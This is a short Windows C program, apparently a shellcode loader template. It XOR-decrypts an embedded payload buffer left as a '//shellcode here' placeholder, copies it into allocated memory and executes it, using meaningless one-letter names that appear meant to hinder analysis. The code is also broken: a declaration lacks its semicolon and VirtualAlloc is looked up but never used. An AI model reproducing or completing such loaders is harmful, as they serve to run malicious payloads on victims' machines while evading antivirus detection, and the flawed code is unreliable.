#define WIN32_LEAN_AND_MEAN
#include <stdio.h>
#include <windows.h>
#include <string.h>

typedef void (*FnPtr)();
char *a = "#12122$14112";
unsigned char b[] =""  //shellcode here
void c(unsigned char *d)
{
    int e, f;
    int g = strlen(d);
    int h = sizeof(b) - 1;

    for (e = 0, f = 0; e < h; e++, f++)
    {
        b[e] = b[e] ^ d[f % g];
    }
}

void i(unsigned char *j, unsigned char *k, size_t l)
{
    size_t m;
    for (m = 0; m < l; m++)
    {
        j[m] = k[m];
    }
}

void *n(size_t o)
{
    void *p = malloc(o);
    if (p != NULL)
    {
        memset(p, 0, o);
    }
    return p;
}

int main()
{
    void *q;
    char r[] = "1234567890123456";
    int s = sizeof(b);

    c(r);

    HMODULE t = GetModuleHandle("kernel32.dll");
    if (t != NULL)
    {
        FnPtr u = (FnPtr)GetProcAddress(t, "VirtualAlloc");
        if (u != NULL)
        {
            q = n(s);
            if (q != NULL)
            {
                i(q, b, s);
                FnPtr v = (FnPtr)q;
                v();
            }
        }
    }

    return 0;
}
